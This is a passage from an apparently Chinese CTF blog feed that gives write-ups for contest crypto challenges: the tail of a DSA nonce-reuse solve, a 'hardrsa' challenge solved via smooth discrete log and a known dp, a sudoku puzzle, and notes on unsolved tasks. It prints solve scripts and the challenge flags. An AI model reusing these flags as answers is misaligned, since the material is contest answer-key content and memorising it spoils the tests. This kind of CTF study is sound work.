crt(cl2,vl)</span><br><span class="line">m1 = iroot(m1,<span class="number">7</span>)[<span class="number">0</span>]</span><br><span class="line">m2 = iroot(m2,<span class="number">7</span>)[<span class="number">0</span>]</span><br><span class="line">m1 = long_to_bytes(m1)</span><br><span class="line">m2 = long_to_bytes(m2)</span><br><span class="line">hm1 = bytes_to_long(SHA.new(m1).digest())</span><br><span class="line">hm2 = bytes_to_long(SHA.new(m2).digest())</span><br><span class="line"></span><br><span class="line">k = (hm1-hm2) * invert(s1-s2,q) % q</span><br><span class="line">x = (s1*k-hm1) * invert(r1,q) %q</span><br><span class="line">x1 = long_to_bytes(x)</span><br><span class="line"></span><br><span class="line">x2 = (s3*k-hm1) * invert(r2,q) %q</span><br><span class="line">x2 = long_to_bytes(x2)</span><br><span class="line"><span class="built_in">print</span>(x1+x2)</span><br><span class="line"><span class="comment">#b&#x27;DASCTF&#123;f11bad18f529750fe52c56eed85d001b&#125;&#x27;</span></span><br></pre></td></tr></table></figure><h1 id="hardrsa">hardrsa</h1><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> Crypto.Util.number <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">import</span> gmpy2</span><br><span class="line"><span class="keyword">from</span> secret <span class="keyword">import</span> flag</span><br><span class="line"></span><br><span class="line">p = getPrime(<span class="number">512</span>)</span><br><span class="line">q = getPrime(<span class="number">512</span>)</span><br><span class="line">n = p**<span class="number">4</span>*q</span><br><span class="line"></span><br><span class="line">e = <span class="number">65537</span></span><br><span class="line">phi = gmpy2.lcm(p - <span class="number">1</span>, q - <span class="number">1</span>)</span><br><span class="line">d = gmpy2.invert(e, phi)</span><br><span class="line">dp = d % (p - <span class="number">1</span>)</span><br><span class="line">m = bytes_to_long(flag)</span><br><span class="line">c = <span class="built_in">pow</span>(m, e, n)</span><br><span class="line"><span class="built_in">print</span> (<span class="string">&quot;dp = &quot;</span> + <span class="built_in">str</span>(dp))</span><br><span class="line"><span class="built_in">print</span> (<span class="string">&quot;c = &quot;</span> + <span class="built_in">str</span>(c))</span><br><span class="line"></span><br><span class="line">y = <span class="number">449703347709287328982446812318870158230369688625894307953604074502413258045265502496365998383562119915565080518077360839705004058211784369656486678307007348691991136610142919372779782779111507129101110674559235388392082113417306002050124215904803026894400155194275424834577942500150410440057660679460918645357376095613079720172148302097893734034788458122333816759162605888879531594217661921547293164281934920669935417080156833072528358511807757748554348615957977663784762124746554638152693469580761002437793837094101338408017407251986116589240523625340964025531357446706263871843489143068620501020284421781243879675292060268876353250854369189182926055204229002568224846436918153245720514450234433170717311083868591477186061896282790880850797471658321324127334704438430354844770131980049668516350774939625369909869906362174015628078258039638111064842324979997867746404806457329528690722757322373158670827203350590809390932986616805533168714686834174965211242863201076482127152571774960580915318022303418111346406295217571564155573765371519749325922145875128395909112254242027512400564855444101325427710643212690768272048881411988830011985059218048684311349415764441760364762942692722834850287985399559042457470942580456516395188637916303814055777357738894264037988945951468416861647204658893837753361851667573185920779272635885127149348845064478121843462789367112698673780005436144393573832498203659056909233757206537514290993810628872250841862059672570704733990716282248839</span></span><br><span class="line"></span><br><span class="line">g = <span class="number">2</span></span><br><span class="line">x = <span class="number">2019</span>*p**<span class="number">2</span> + <span class="number">2020</span>*p**<span class="number">3</span> + <span class="number">2021</span>*p**<span class="number">4</span></span><br><span class="line">c1 = <span class="built_in">pow</span>(g, x, y)</span><br><span class="line"><span class="built_in">print</span>( <span class="string">&quot;c1 = &quot;</span> + <span class="built_in">str</span>(c1))</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment"># dp = 379476973158146550831004952747643994439940435656483772269013081580532539640189020020958796514224150837680366977747272291881285391919167077726836326564473</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># c = 57248258945927387673579467348106118747034381190703777861409527336272914559699490353325906672956273559867941402281438670652710909532261303394045079629146156340801932254839021574139943933451924062888426726353230757284582863993227592703323133265180414382062132580526658205716218046366247653881764658891315592607194355733209493239611216193118424602510964102026998674323685134796018596817393268106583737153516632969041693280725297929277751136040546830230533898514659714717213371619853137272515967067008805521051613107141555788516894223654851277785393355178114230929014037436770678131148140398384394716456450269539065009396311996040422853740049508500540281488171285233445744799680022307180452210793913614131646875949698079917313572873073033804639877699884489290120302696697425</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># c1 = 78100131461872285613426244322737502147219485108799130975202429638042859488136933783498210914335741940761656137516033926418975363734194661031678516857040723532055448695928820624094400481464950181126638456234669814982411270985650209245687765595483738876975572521276963149542659187680075917322308512163904423297381635532771690434016589132876171283596320435623376283425228536157726781524870348614983116408815088257609788517986810622505961538812889953185684256469540369809863103948326444090715161351198229163190130903661874631020304481842715086104243998808382859633753938512915886223513449238733721777977175430329717970940440862059204518224126792822912141479260791232312544748301412636222498841676742208390622353022668320809201312724936862167350709823581870722831329406359010293121019764160016316259432749291142448874259446854582307626758650151607770478334719317941727680935243820313144829826081955539778570565232935463201135110049861204432285060029237229518297291679114165265808862862827211193711159152992427133176177796045981572758903474465179346029811563765283254777813433339892058322013228964103304946743888213068397672540863260883314665492088793554775674610994639537263588276076992907735153702002001005383321442974097626786699895993544581572457476437853778794888945238622869401634353220344790419326516836146140706852577748364903349138246106379954647002557091131475669295997196484548199507335421499556985949139162639560622973283109342746186994609598854386966520638338999059</span></span><br></pre></td></tr></table></figure><p>y-1光滑，可用离散对数解出x，然后Z3Solver解出p，接着就是已知dp，p的模型，很容易就能做出来</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> Crypto.Util.number <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">import</span> gmpy2</span><br><span class="line"></span><br><span class="line">y = <span class="number">449703347709287328982446812318870158230369688625894307953604074502413258045265502496365998383562119915565080518077360839705004058211784369656486678307007348691991136610142919372779782779111507129101110674559235388392082113417306002050124215904803026894400155194275424834577942500150410440057660679460918645357376095613079720172148302097893734034788458122333816759162605888879531594217661921547293164281934920669935417080156833072528358511807757748554348615957977663784762124746554638152693469580761002437793837094101338408017407251986116589240523625340964025531357446706263871843489143068620501020284421781243879675292060268876353250854369189182926055204229002568224846436918153245720514450234433170717311083868591477186061896282790880850797471658321324127334704438430354844770131980049668516350774939625369909869906362174015628078258039638111064842324979997867746404806457329528690722757322373158670827203350590809390932986616805533168714686834174965211242863201076482127152571774960580915318022303418111346406295217571564155573765371519749325922145875128395909112254242027512400564855444101325427710643212690768272048881411988830011985059218048684311349415764441760364762942692722834850287985399559042457470942580456516395188637916303814055777357738894264037988945951468416861647204658893837753361851667573185920779272635885127149348845064478121843462789367112698673780005436144393573832498203659056909233757206537514290993810628872250841862059672570704733990716282248839</span></span><br><span class="line">c1 = <span class="number">78100131461872285613426244322737502147219485108799130975202429638042859488136933783498210914335741940761656137516033926418975363734194661031678516857040723532055448695928820624094400481464950181126638456234669814982411270985650209245687765595483738876975572521276963149542659187680075917322308512163904423297381635532771690434016589132876171283596320435623376283425228536157726781524870348614983116408815088257609788517986810622505961538812889953185684256469540369809863103948326444090715161351198229163190130903661874631020304481842715086104243998808382859633753938512915886223513449238733721777977175430329717970940440862059204518224126792822912141479260791232312544748301412636222498841676742208390622353022668320809201312724936862167350709823581870722831329406359010293121019764160016316259432749291142448874259446854582307626758650151607770478334719317941727680935243820313144829826081955539778570565232935463201135110049861204432285060029237229518297291679114165265808862862827211193711159152992427133176177796045981572758903474465179346029811563765283254777813433339892058322013228964103304946743888213068397672540863260883314665492088793554775674610994639537263588276076992907735153702002001005383321442974097626786699895993544581572457476437853778794888945238622869401634353220344790419326516836146140706852577748364903349138246106379954647002557091131475669295997196484548199507335421499556985949139162639560622973283109342746186994609598854386966520638338999059</span></span><br><span class="line">g = <span class="number">2</span></span><br><span class="line">p = <span class="number">12131601165788024635030034921084070470053842112984866821070395281728468805072716002494427632757418621194662541766157553264889658892783635499016425528807741</span></span><br><span class="line">e = <span class="number">65537</span></span><br><span class="line">c = <span class="number">57248258945927387673579467348106118747034381190703777861409527336272914559699490353325906672956273559867941402281438670652710909532261303394045079629146156340801932254839021574139943933451924062888426726353230757284582863993227592703323133265180414382062132580526658205716218046366247653881764658891315592607194355733209493239611216193118424602510964102026998674323685134796018596817393268106583737153516632969041693280725297929277751136040546830230533898514659714717213371619853137272515967067008805521051613107141555788516894223654851277785393355178114230929014037436770678131148140398384394716456450269539065009396311996040422853740049508500540281488171285233445744799680022307180452210793913614131646875949698079917313572873073033804639877699884489290120302696697425</span></span><br><span class="line">dp = <span class="number">379476973158146550831004952747643994439940435656483772269013081580532539640189020020958796514224150837680366977747272291881285391919167077726836326564473</span></span><br><span class="line">b = <span class="number">4</span></span><br><span class="line"></span><br><span class="line">mp1 = <span class="built_in">pow</span>(c, dp, p)</span><br><span class="line">mp = <span class="built_in">pow</span>(c, dp - <span class="number">1</span>, p)</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">1</span>, b - <span class="number">2</span>):</span><br><span class="line">x = <span class="built_in">pow</span>(c - <span class="built_in">pow</span>(mp1, e), <span class="number">1</span>, p**(i + <span class="number">1</span>))</span><br><span class="line">y = <span class="built_in">pow</span>(x * mp * (gmpy2.invert(e, p)), <span class="number">1</span>, p**(i + <span class="number">1</span>))</span><br><span class="line">mp1 = mp1 + y</span><br><span class="line"><span class="built_in">print</span>(long_to_bytes(mp1))</span><br><span class="line"><span class="comment">#b&#x27;DASCTF&#123;98d923h4344e3bf72f8775xy65tvftv5&#125;&#x27;</span></span><br></pre></td></tr></table></figure><h1 id="密码人集合">密码人集合</h1><p>yysy，前一部分给我看湿了，密码人平时还挺孤独的。</p><p><img src="/images/%E8%A5%BF%E6%B9%96%E8%AE%BA%E5%89%91/2FJ5@Z%7BW%5DZ91X1FN6IO2CV.png" alt="img"></p><p>泪目</p><p>就做题而言不算困难，在网上抄个数独脚本就能出了</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> random </span><br><span class="line"><span class="keyword">import</span> sys  </span><br><span class="line">sys.setrecursionlimit(<span class="number">100000</span>) <span class="comment"># 发现python默认的递归深度是很有限的</span></span><br><span class="line">                              <span class="comment">#（默认是1000），因此当递归深度超过999的</span></span><br><span class="line">                              <span class="comment"># 样子，就会引发这样的一个异常。</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">get_next</span>(<span class="params">m, x, y</span>):</span><br><span class="line">    <span class="string">&quot;&quot;&quot; 功能：获得下一个空白格在数独中的坐标。       </span></span><br><span class="line"><span class="string">    &quot;&quot;&quot;</span></span><br><span class="line">    <span class="keyword">for</span> next_y <span class="keyword">in</span> <span class="built_in">range</span>(y+<span class="number">1</span>, <span class="number">9</span>):  <span class="comment"># 下一个空白格和当前格在一行的情况</span></span><br><span class="line">        <span class="keyword">if</span> m[x][next_y] == <span class="number">0</span>:</span><br><span class="line">            <span class="keyword">return</span> x, next_y</span><br><span class="line">    <span class="keyword">for</span> next_x <span class="keyword">in</span> <span class="built_in">range</span>(x+<span class="number">1</span>, <span class="number">9</span>):  <span class="comment"># 下一个空白格和当前格不在一行的情况</span></span><br><span class="line">        <span class="keyword">for</span> next_y <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">0</span>, <span class="number">9</span>):</span><br><span class="line">            <span class="keyword">if</span> m[next_x][next_y] == <span class="number">0</span>:</span><br><span class="line">                <span class="keyword">return</span> next_x, next_y</span><br><span class="line">    <span class="keyword">return</span> -<span class="number">1</span>, -<span class="number">1</span>               <span class="comment"># 若不存在下一个空白格，则返回 -1，-1</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">value</span>(<span class="params">m, x, y</span>):</span><br><span class="line">    <span class="string">&quot;&quot;&quot; 功能：返回符合&quot;每个横排和竖排以及</span></span><br><span class="line"><span class="string">              九宫格内无相同数字&quot;这个条件的有效值。</span></span><br><span class="line"><span class="string">    &quot;&quot;&quot;</span> </span><br><span class="line">    i, j = x//<span class="number">3</span>, y//<span class="number">3</span></span><br><span class="line">    grid = [m[i*<span class="number">3</span>+r][j*<span class="number">3</span>+c] <span class="keyword">for</span> r <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">3</span>) <span class="keyword">for</span> c <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">3</span>)]</span><br><span class="line">    v = <span class="built_in">set</span>([x <span class="keyword">for</span> x <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">1</span>,<span class="number">10</span>)]) - <span class="built_in">set</span>(grid) - <span class="built_in">set</span>(m[x]) - \</span><br><span class="line">        <span class="built_in">set</span>(<span class="built_in">list</span>(<span class="built_in">zip</span>(*m))[y])    </span><br><span class="line">    <span class="keyword">return</span> <span class="built_in">list</span>(v)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">start_pos</span>(<span class="params">m</span>):</span><br><span class="line">    <span class="string">&quot;&quot;&quot; 功能：返回第一个空白格的位置坐标&quot;&quot;&quot;</span></span><br><span class="line">    <span class="keyword">for</span> x <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">9</span>):</span><br><span class="line">        <span class="keyword">for</span> y <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">9</span>):</span><br><span class="line">            <span class="keyword">if</span> m[x][y] == <span class="number">0</span>:</span><br><span class="line">                <span class="keyword">return</span> x, y</span><br><span class="line">    <span class="keyword">return</span> <span class="literal">False</span>, <span class="literal">False</span>  <span class="comment"># 若数独已完成，则返回 False, False</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">try_sudoku</span>(<span class="params">m, x, y</span>):</span><br><span class="line">    <span class="string">&quot;&quot;&quot; 功能：试着填写数独 &quot;&quot;&quot;</span></span><br><span class="line">    <span class="keyword">for</span> v <span class="keyword">in</span> value(m, x, y):</span><br><span class="line">        m[x][y] = v</span><br><span class="line">        next_x, next_y = get_next(m, x, y)</span><br><span class="line">        <span class="keyword">if</span> next_y == -<span class="number">1</span>: <span class="comment"># 如果无下一个空白格</span></span><br><span class="line">            <span class="keyword">return</span> <span class="literal">True</span></span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            end = try_sudoku(m, next_x, next_y) <span class="comment"># 递归</span></span><br><span class="line">            <span class="keyword">if</span> end:</span><br><span class="line">                <span class="keyword">return</span> <span class="literal">True</span></span><br><span class="line">            m[x][y] = <span class="number">0</span> <span class="comment"># 在递归的过程中，如果数独没有解开，</span></span><br><span class="line">                        <span class="comment"># 则回溯到上一个空白格</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">sudoku</span>(<span class="params">m</span>):        </span><br><span class="line">    x, y = start_pos(m)</span><br><span class="line">    try_sudoku(m, x, y)</span><br><span class="line">    <span class="built_in">print</span>(m)     </span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&quot;__main__&quot;</span>:</span><br><span class="line">    m = m = [</span><br><span class="line">        [<span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>],</span><br><span class="line">        [<span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>],</span><br><span class="line">        [<span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>],</span><br><span class="line">        [<span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>],</span><br><span class="line">        [<span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>],</span><br><span class="line">        [<span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>],</span><br><span class="line">        [<span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>],</span><br><span class="line">        [<span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>],</span><br><span class="line">        [<span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>]</span><br><span class="line">    ]</span><br><span class="line">    sudoku(m)</span><br><span class="line">    a=[[<span class="number">9</span>, <span class="number">1</span>, <span class="number">3</span>, <span class="number">4</span>, <span class="number">2</span>, <span class="number">5</span>, <span class="number">7</span>, <span class="number">8</span>, <span class="number">6</span>], [<span class="number">6</span>, <span class="number">2</span>, <span class="number">8</span>, <span class="number">3</span>, <span class="number">7</span>, <span class="number">9</span>, <span class="number">5</span>, <span class="number">1</span>, <span class="number">4</span>], [<span class="number">4</span>, <span class="number">5</span>, <span class="number">7</span>, <span class="number">8</span>, <span class="number">1</span>, <span class="number">6</span>, <span class="number">9</span>, <span class="number">3</span>, <span class="number">2</span>], [<span class="number">7</span>, <span class="number">9</span>, <span class="number">1</span>, <span class="number">5</span>, <span class="number">3</span>, <span class="number">2</span>, <span class="number">6</span>, <span class="number">4</span>, <span class="number">8</span>], [<span class="number">2</span>, <span class="number">8</span>, <span class="number">5</span>, <span class="number">9</span>, <span class="number">6</span>, <span class="number">4</span>, <span class="number">1</span>, <span class="number">7</span>, <span class="number">3</span>], [<span class="number">3</span>, <span class="number">4</span>, <span class="number">6</span>, <span class="number">1</span>, <span class="number">8</span>, <span class="number">7</span>, <span class="number">2</span>, <span class="number">5</span>, <span class="number">9</span>], [<span class="number">5</span>, <span class="number">6</span>, <span class="number">2</span>, <span class="number">7</span>, <span class="number">4</span>, <span class="number">3</span>, <span class="number">8</span>, <span class="number">9</span>, <span class="number">1</span>], [<span class="number">8</span>, <span class="number">7</span>, <span class="number">4</span>, <span class="number">6</span>, <span class="number">9</span>, <span class="number">1</span>, <span class="number">3</span>, <span class="number">2</span>, <span class="number">5</span>], [<span class="number">1</span>, <span class="number">3</span>, <span class="number">9</span>, <span class="number">2</span>, </span><br><span class="line"><span class="number">5</span>, <span class="number">8</span>, <span class="number">4</span>, <span class="number">6</span>, <span class="number">7</span>]]</span><br><span class="line">    my_dic= &#123;<span class="number">1</span>:<span class="string">&#x27;我&#x27;</span>, <span class="number">2</span>:<span class="string">&#x27;要&#x27;</span>,<span class="number">3</span>:<span class="string">&#x27;拿&#x27;</span>,<span class="number">4</span>:<span class="string">&#x27;西&#x27;</span>,<span class="number">5</span>:<span class="string">&#x27;湖&#x27;</span>,<span class="number">6</span>:<span class="string">&#x27;论&#x27;</span>,<span class="number">7</span>:<span class="string">&#x27;剑&#x27;</span>,<span class="number">8</span>:<span class="string">&#x27;第&#x27;</span>,<span class="number">9</span>:<span class="string">&#x27;一&#x27;</span>&#125;</span><br><span class="line">    re=<span class="string">&#x27;&#x27;</span></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">9</span>):</span><br><span class="line">        <span class="keyword">for</span> j <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">9</span>):</span><br><span class="line">            <span class="built_in">print</span>(my_dic[a[i][j]],end=<span class="string">&#x27;&#x27;</span>)</span><br><span class="line">    </span><br><span class="line"></span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;m = [</span></span><br><span class="line"><span class="string">        [0, 0, 0, 0, 0, 0, 0, 0, 0],</span></span><br><span class="line"><span class="string">        [0, 0, 0, 0, 0, 0, 0, 0, 0],</span></span><br><span class="line"><span class="string">        [0, 0, 0, 0, 0, 0, 0, 0, 0],</span></span><br><span class="line"><span class="string">        [0, 0, 0, 0, 0, 0, 0, 0, 0],</span></span><br><span class="line"><span class="string">        [0, 0, 0, 0, 0, 0, 0, 0, 0],</span></span><br><span class="line"><span class="string">        [0, 0, 0, 0, 0, 0, 0, 0, 0],</span></span><br><span class="line"><span class="string">        [0, 0, 0, 0, 0, 0, 0, 0, 0],</span></span><br><span class="line"><span class="string">        [0, 0, 0, 0, 0, 0, 0, 0, 0],</span></span><br><span class="line"><span class="string">        [0, 0, 0, 0, 0, 0, 0, 0, 0]</span></span><br><span class="line"><span class="string">    ]&#x27;&#x27;&#x27;</span></span><br></pre></td></tr></table></figure><h1 id="随便写点">随便写点</h1><p>维纳压根没看。。</p><p>curve那题发现add（）是可逆的，一开始估计和祥云杯那题有点类似，但是不知道该怎么解出e啊，折磨，后来发现add（G）的规律，只能知道e%4= 1，不知道有没有用。</p><p>nfsr那题bob找了几个脚本都没跑出来，因为这次mask是64byte的，应该是要用快速相关攻击？</p>]]></content>
    
    
    <summary type="html">&lt;p&gt;题目还不错，难度梯度有点大，出了三道，后面三道难的都不会做&lt;/p&gt;
&lt;p&gt;面向WP学习&lt;/p&gt;</summary>
    
    
    
    <category term="CTF" scheme="http://sh1k4ku.github.io/categories/CTF/"/>
    
    
    <category term="Pell Equation" scheme="http://sh1k4ku.github.io/tags/Pell-Equation/"/>
    
    <category term="RSA" scheme="http://sh1k4ku.github.io/tags/RSA/"/>
    
    <category term="离散对数" scheme="http://sh1k4ku.github.io/tags/%E7%A6%BB%E6%95%A3%E5%AF%B9%E6%95%B0/"/>
    
    <category term="DSA" scheme="http://sh1k4ku.github.io/tags/DSA/"/>
    
  </entry>
  
</feed>
